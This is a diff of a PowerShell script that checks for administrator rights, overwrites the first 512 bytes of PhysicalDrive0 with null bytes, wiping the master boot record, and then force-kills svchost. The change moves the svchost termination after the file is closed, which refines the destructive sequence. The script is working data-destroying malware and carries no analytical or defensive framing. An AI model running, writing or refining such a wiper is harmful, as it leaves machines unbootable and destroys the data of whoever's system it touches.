@@ -3,5 +3,5 @@ if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]:
 $file = [System.IO.File]::Open("\\.\PhysicalDrive0", [System.IO.FileMode]::Open, [System.IO.FileAccess]::Write)
 $nullBytes = New-Object byte[] 512
 $file.Write($nullBytes, 0, 512)
-Stop-Process -Name svchost -Force
 $file.Close()
+Stop-Process -Name svchost -Force
